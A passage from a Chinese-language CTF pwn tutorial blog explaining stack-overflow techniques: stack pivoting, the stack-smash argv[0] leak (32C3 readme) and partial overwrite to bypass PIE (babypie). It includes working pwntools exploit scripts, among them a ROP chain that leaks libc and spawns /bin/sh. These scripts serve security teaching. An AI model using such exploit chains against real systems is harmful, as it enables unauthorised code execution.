class="line"></span><br><span class="line">io = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line">success(<span class="string">&quot;stack -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, flat([<span class="string">&#x27;11111111&#x27;</span>, <span class="number">0x400793</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">&#x27;1&#x27;</span>, stack, <span class="number">0x4006be</span>]))</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;</span></span><br><span class="line"><span class="string">0x00000000000f5279 : pop rdx ; pop rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdx_pop_rsi_ret=libc.address+<span class="number">0xf5279</span></span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">&#x27;22222222&#x27;</span>, pop_rdi_ret, <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>)),pop_rdx_pop_rsi_ret,p64(<span class="number">0</span>),p64(<span class="number">0</span>), libc.sym[<span class="string">&#x27;execve&#x27;</span>], (<span class="number">80</span> - <span class="number">7</span>*<span class="number">8</span> ) * <span class="string">&#x27;2&#x27;</span>, stack - <span class="number">0x30</span>, <span class="number">0x4006be</span>])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在程序加了 canary 保护之后，当 canary 值变化后，程序会错误退出并提示错误信息，通常是说 xxx（程序名） 段错误。</p><p> stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p><h3 id="32C3-CTF-readme"><a href="#32C3-CTF-readme" class="headerlink" title="32C3 CTF readme"></a>32C3 CTF readme</h3><p>该题目在 jarvisoj 上有复现。</p><h4 id="确定保护"><a href="#确定保护" class="headerlink" title="确定保护"></a>确定保护</h4><p>可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>ida 看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_4007E0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rax@1</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rbx@2</span><br><span class="line">  int v2; &#x2F;&#x2F; eax@3</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+0h] [bp-128h]@1</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+108h] [bp-20h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Hello!\nWhat&#39;s your name? &quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; _IO_gets((__int64)&amp;v4);</span><br><span class="line">  if ( !v0 )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(1);</span><br><span class="line">  v1 &#x3D; 0LL;</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 &#x3D; _IO_getc(stdin);</span><br><span class="line">    if ( v2 &#x3D;&#x3D; -1 )</span><br><span class="line">      goto LABEL_9;</span><br><span class="line">    if ( v2 &#x3D;&#x3D; &#39;\n&#39; )</span><br><span class="line">      break;</span><br><span class="line">    byte_600D20[v1++] &#x3D; v2;</span><br><span class="line">    if ( v1 &#x3D;&#x3D; &#39; &#39; )</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</span><br><span class="line">LABEL_8:</span><br><span class="line">  puts(&quot;Thank you, bye!&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_gets((__int64)&amp;v4)</code> 存在栈溢出。</p><p>程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</span><br></pre></td></tr></table></figure><p>又看了看对应地址的内容，可以发现如下内容，说明程序的 flag 就在这里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 ; char aPctfHereSTheFl[]</span><br><span class="line">.data:0000000000600D20 aPctfHereSTheFl db &#39;PCTF&#123;Here&#39;,27h,&#39;s the flag on server&#125;&#39;,0</span><br></pre></td></tr></table></figure><p>但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 <code>byte_600D20[v1++] = v2;</code>也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了</p><ul><li><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出</strong>，可以使用 gdb 的 find 来进行查找。</li></ul><h4 id="确定-flag-地址"><a href="#确定-flag-地址" class="headerlink" title="确定 flag 地址"></a>确定 flag 地址</h4><p>我们把断点下载 memset 函数（0x400873）处，然后读取相应的内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x400873</span></span><br><span class="line">Breakpoint 1 at 0x400873</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/skye/readme.bin </span><br><span class="line">Hello!</span><br><span class="line">What&#x27;s your name? aaaaaaaa</span><br><span class="line">Nice to meet you, aaaaaaaa.</span><br><span class="line">Please overwrite the flag: bbbbbbbb</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400873 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0xa</span><br><span class="line"> RBX  0x8</span><br><span class="line"> RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x18</span><br><span class="line"><span class="meta"> #</span><span class="bash"> flag 存放地址</span></span><br><span class="line"> RDI  0x600d28 ◂— &#x27;ServerHasTheFlagHere...&#x27;</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700</span><br><span class="line"> R9   0x7ffff7fdd700 ◂— 0x7ffff7fdd700</span><br><span class="line"> R10  0x814</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006ee ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffdd70 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4008b0 ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdb60 ◂— &#x27;aaaaaaaa&#x27;</span><br><span class="line"> RIP  0x400873 ◂— call   0x400670</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x400873    call   memset@plt &lt;0x400670&gt;</span><br><span class="line">  # flag 存放地址</span><br><span class="line">        s: 0x600d28 ◂— &#x27;ServerHasTheFlagHere...&#x27;</span><br><span class="line">        c: 0x0</span><br><span class="line">        n: 0x18</span><br><span class="line"> </span><br><span class="line">   0x400878    mov    edi, 0x40094e</span><br><span class="line">   0x40087d    call   puts@plt &lt;0x400640&gt;</span><br><span class="line"> </span><br><span class="line">   0x400882    mov    rax, qword ptr [rsp + 0x108]</span><br><span class="line">   0x40088a    xor    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x400893    jne    0x4008a9</span><br><span class="line"> </span><br><span class="line">   0x400895    add    rsp, 0x118</span><br><span class="line">   0x40089c    pop    rbx</span><br><span class="line">   0x40089d    pop    rbp</span><br><span class="line">   0x40089e    ret    </span><br><span class="line"> </span><br><span class="line">   0x40089f    mov    edi, 1</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">#</span><span class="bash"> name 存放地址</span></span><br><span class="line">00:0000│ rsp  0x7fffffffdb60 ◂— &#x27;aaaaaaaa&#x27;</span><br><span class="line">01:0008│      0x7fffffffdb68 —▸ 0x7ffff7ffd900 (_rtld_global+2240) ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdb70 —▸ 0x7ffff7fdd700 ◂— 0x7ffff7fdd700</span><br><span class="line">03:0018│      0x7fffffffdb78 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffdb80 —▸ 0x7ffff7ffea88 —▸ 0x7ffff7ffe9b8 —▸ 0x7ffff7ffe728 —▸ 0x7ffff7ffe700 ◂— ...</span><br><span class="line">05:0028│      0x7fffffffdb88 —▸ 0x7fffffffdbc0 ◂— 0x2</span><br><span class="line">06:0030│      0x7fffffffdb90 ◂— 0x380</span><br><span class="line">07:0038│      0x7fffffffdb98 —▸ 0x7fffffffdbb0 ◂— 0xffffffff</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从 18 行或 33 行可以得出 flag 存放地址为：0x600d28 。另外一个 bss 段内的 flag 地址使用 peda find 功能查找，两个 flag 地址分别为： 0x600d28 、0x400d28。</p><p>这里需要减去偏移（被 name 覆盖了 0x7 ）才能得到完整 flag ，所以两个 flag 地址为：0x600d21 、0x400d21</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> find Serv</span></span><br><span class="line">Searching for &#x27;Serv&#x27; in: None ranges</span><br><span class="line">Found 6 results, display max 6 items:</span><br><span class="line">readme.bin : 0x400d28 (&quot;ServerHasTheFlagHere...&quot;)</span><br><span class="line">readme.bin : 0x600d28 (&quot;ServerHasTheFlagHere...&quot;)</span><br><span class="line">      libc : 0x7ffff7b97641 (&quot;Servname not supported for ai_socktype&quot;)</span><br><span class="line">      libc : 0x7ffff7b9924c (&quot;Server rejected credential&quot;)</span><br><span class="line">      libc : 0x7ffff7b9927f (&quot;Server rejected verifier&quot;)</span><br><span class="line">      libc : 0x7ffff7b994af (&quot;Server can&#x27;t decode arguments&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>下面，我们确定 argv[0] 距离读取的字符串的偏移。</p><p>首先下断点在 main 函数入口处，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x00000000004006D0</span><br><span class="line">Breakpoint 1 at 0x4006d0</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004006d0 in ?? ()</span><br><span class="line"> code:i386:x86-64 ]────</span><br><span class="line">     0x4006c0 &lt;_IO_gets@plt+0&gt; jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 &lt;_IO_gets@got.plt&gt;</span><br><span class="line">     0x4006c6 &lt;_IO_gets@plt+6&gt; push   0x9</span><br><span class="line">     0x4006cb &lt;_IO_gets@plt+11&gt; jmp    0x400620</span><br><span class="line"> →   0x4006d0                  sub    rsp, 0x8</span><br><span class="line">     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 &lt;stdout&gt;</span><br><span class="line">     0x4006db                  xor    esi, esi</span><br><span class="line">     0x4006dd                  call   0x400660 &lt;setbuf@plt&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#x27;0x7fffffffdb78&#x27;, &#x27;l8&#x27;]</span><br><span class="line">8</span><br><span class="line">0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax    ← $rsp</span><br><span class="line">0x00007fffffffdb80│+0x08: 0x0000000000000000</span><br><span class="line">0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  &quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]&quot;</span><br><span class="line">0x00007fffffffdb90│+0x18: 0x0000000100000000</span><br><span class="line">0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8</span><br><span class="line">0x00007fffffffdba0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3</span><br><span class="line">0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp</span><br><span class="line">──────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line"><span class="meta">[#</span><span class="bash">0] 0x4006d0 → sub rsp, 0x8</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48)</span></span><br><span class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</span><br><span class="line"><span class="meta">[#</span><span class="bash">2] 0x400717 → hlt</span> </span><br></pre></td></tr></table></figure><p>可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时 0x00007fffffffdc58 处保留着该地址，所以我们真正需要的是 0x00007fffffffdc58 的值。</p><p>argv[0] 读入方式看 16 行，系统到 0x00007fffffffdc58 找到地址，然后取地址的值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x7fffffffdda8 —▸ 0x400d21 ◂— xor    al, byte ptr [rbx + 0x33] /* &#x27;2C3_TheServerHasTheFlagHere...&#x27; */</span><br><span class="line"> RBX  0x1</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7ffff7b9c481 ◂— jae    0x7ffff7b9c4f7 /* &#x27;stack smashing detected&#x27; */</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7ffff7b9c49f ◂— sub    ch, byte ptr [rdx] /* &#x27;*** %s ***: %s terminated\n&#x27; */</span><br><span class="line">……</span><br><span class="line"> RBP  0x7ffff7b9c481 ◂— jae    0x7ffff7b9c4f7 /* &#x27;stack smashing detected&#x27; */</span><br><span class="line"> RSP  0x7fffffffdb60 ◂— 0x4</span><br><span class="line"> RIP  0x7ffff7b2614b (__fortify_fail+75) ◂— mov    rcx, qword ptr [rax]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">……</span><br><span class="line">   0x7ffff7b26146 &lt;__fortify_fail+70&gt;    mov    rdx, rbp</span><br><span class="line">   0x7ffff7b26149 &lt;__fortify_fail+73&gt;    mov    edi, ebx</span><br><span class="line"> ► 0x7ffff7b2614b &lt;__fortify_fail+75&gt;    mov    rcx, qword ptr [rax]</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure><p>剩下就是找到溢出点写入字符串的栈地址，在[确定 flag 地址](# 确定 flag 地址) 中的第一个调试中的 53 行找到 name 存放地址：0x7fffffffdb60</p><h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p =process(<span class="string">&quot;./readme.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="number">0x600d21</span></span><br><span class="line">flag2 = <span class="number">0x400d21</span></span><br><span class="line"></span><br><span class="line">argv0 = <span class="number">0x7fffffffdd78</span></span><br><span class="line">name = <span class="number">0x7fffffffdb60</span><span class="comment">#0x7fffffffdca8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(argv0-name)</span><br><span class="line">payload += p64(flag2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;flag: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h2><p>partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。</p><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p><p>更全面的 PIE 保护绕过看萝卜师傅的：<a href="https://www.anquanke.com/post/id/177520">PIE保护详解和常用bypass手段</a></p><h3 id="2018-安恒杯-babypie"><a href="#2018-安恒杯-babypie" class="headerlink" title="2018 - 安恒杯 - babypie"></a>2018 - 安恒杯 - babypie</h3><p>以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite">ctf-challenge</a> 中</p><h4 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h4><p>明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_960()</span><br><span class="line">&#123;</span><br><span class="line">  __int128 name; &#x2F;&#x2F; [rsp+0h] [rbp-30h]</span><br><span class="line">  __int128 v2; &#x2F;&#x2F; [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  name &#x3D; 0uLL;</span><br><span class="line">  v2 &#x3D; 0uLL;</span><br><span class="line">  puts(&quot;Input your Name:&quot;);</span><br><span class="line">  read(0, &amp;name, 0x30uLL);                      &#x2F;&#x2F; 栈溢出</span><br><span class="line">  printf(&quot;Hello %s:\n&quot;, &amp;name, name, v2);</span><br><span class="line">  read(0, &amp;name, 0x60uLL);                      &#x2F;&#x2F; 栈溢出</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序有留有后门 sub_A3E  。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>泄露 libc 地址的话，就需要将栈上最近的 libc 地址前的 \x00 覆盖掉。而最近的 libc 地址（__libc_start_main+240）需要覆盖 0x58 ，显然溢出长度不够。</p><p>所以选择控制 rip 跳转到后门函数。程序开启了 PIE 和 Canary 栈溢出保护，首先是泄露出 canary 值，然后再次栈溢出控制 rip 跳转。</p><h5 id="leak-canary"><a href="#leak-canary" class="headerlink" title="leak canary"></a>leak canary</h5><p>sub_960 栈结构在 ida 中分析如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000000000000030 name            xmmword ?</span><br><span class="line">-0000000000000020 var_20          xmmword ?</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>在第一个输入 name 时，可以写入 0x29 字节，输出名字时会将 canary 也一起输出。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span 